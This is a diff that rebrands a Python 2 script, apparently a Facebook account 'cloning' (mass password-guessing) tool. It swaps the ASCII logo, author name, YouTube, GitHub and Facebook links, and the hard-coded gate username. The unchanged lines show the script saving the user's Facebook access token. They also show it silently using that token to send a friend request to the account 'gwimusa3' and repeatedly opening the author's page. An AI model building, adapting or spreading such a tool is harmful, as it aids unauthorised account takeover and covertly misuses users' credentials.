@@ -37,18 +37,25 @@ def jalan(z):
 		time.sleep(00000.1)
 ##### LOGO #####
 logo = """
- _     _          ___         _
- | \   / |       |  __ \     | |
- | \   / |_ __   | |  | |    | |
- | |\ /| | '_|   | |  | |    | |
- | |   | | |     | |__| | |__| |
- |_|   |_|_|     |_____/  \___/
+░██████╗░░░███╗░░░███╗░░░██████╗░
+██╔════╝░░░████╗░████║░░░██╔══██╗
+╚█████╗░░░░██╔████╔██║░░░██████╔╝
+░╚═══██╗░░░██║╚██╔╝██║░░░██╔══██╗
+██████╔╝██╗██║░╚═╝░██║██╗██║░░██║
+╚═════╝░╚═╝╚═╝░░░░░╚═╝╚═╝╚═╝░░╚═╝
+
+███╗░░░███╗██╗██╗░░░░░░█████╗░███╗░░██╗
+████╗░████║██║██║░░░░░██╔══██╗████╗░██║
+██╔████╔██║██║██║░░░░░██║░░██║██╔██╗██║
+██║╚██╔╝██║██║██║░░░░░██║░░██║██║╚████║
+██║░╚═╝░██║██║███████╗╚█████╔╝██║░╚███║
+╚═╝░░░░░╚═╝╚═╝╚══════╝░╚════╝░╚═╝░░╚══╝
  
 \033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mDJ
-\033[1;96mYouTube \033[1;93m: \033[1;92mAnonymous Trickers
-\033[1;96mGitHub  \033[1;93m: \033[1;92mhttps://github.com/FAKHAR143/Mr_DJ
-\033[1;96mBlogger \033[1;93m: \033[1;92mhttps://www.facebook.com/Anonymoustricker1
+\033[1;96mAuthor  \033[1;93m: \033[1;92mSMR
+\033[1;96mYouTube \033[1;93m: \033[1;92mSMR_White_Devil_MILON
+\033[1;96mGitHub  \033[1;93m: \033[1;92mhttps://github.com/SMRmilon01/smrDJ
+\033[1;96mBlogger \033[1;93m: \033[1;92mhttps://www.facebook.com/SMR_White_Devil_MILON
 \033[1;91m======================================="""
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -66,13 +73,13 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print "\033[1;96m ========================================="
 print  """\033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mDJ
-\033[1;96mYouTube \033[1;93m: \033[1;92mAnonymous Trickers
-\033[1;96mGitHub  \033[1;93m: \033[1;92mhttps://github.com/FAKHAR143/Mr_DJ
-\033[1;96mpage \033[1;93m: \033[1;92mhttps://www.facebook.com/Anonymoustricker1
+\033[1;96mAuthor  \033[1;93m: \033[1;92mSMR
+\033[1;96mYouTube \033[1;93m: \033[1;92mSMR_White_Devil_MILON
+\033[1;96mGitHub  \033[1;93m: \033[1;92mhttps://github.com/SMRmilon01/smrDJ
+\033[1;96mpage \033[1;93m: \033[1;92mhttps://www.facebook.com/SMR_White_Devil_MILON
 \033[1;91m======================================="""
 print " \x1b[1;93m============================================================="
-CorrectUsername = "DJDJDJ"
+CorrectUsername = "SMRDJ"
 CorrectPassword = "DJDJDJ"
 loop = 'true'
 while (loop == 'true'):
@@ -84,10 +91,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Wrong Password"
-            os.system('xdg-open https://www.facebook.com/Anonymoustricker1')
+            os.system('xdg-open https://www.facebook.com/SMR_White_Devil_MILON')
     else:
         print "Wrong Username"
-        os.system('xdg-open https://www.facebook.com/Anonymoustricker1')
+        os.system('xdg-open https://www.facebook.com/SMR_White_Devil_MILON')
 def login():
 	os.system('clear')
 	try:
@@ -128,7 +135,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m\x1b[1;92mLogin Successful'
-				os.system('xdg-open https://www.facebook.com/Anonymoustricker1')
+				os.system('xdg-open https://www.facebook.com/SMR_White_Devil_MILON')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -175,7 +182,7 @@ def menu():
 	print "\033[1;96m[\033[1;97m \033[1;96m]\033[1;93m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m               "
 	print "\033[1;96m[\033[1;97m \033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
 	print 42*"\033[1;96m="
-	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Start CLONING WITH DJ"
+	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Start CLONING WITH SMR"
 	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Exit            "
 	pilih()
 def pilih():
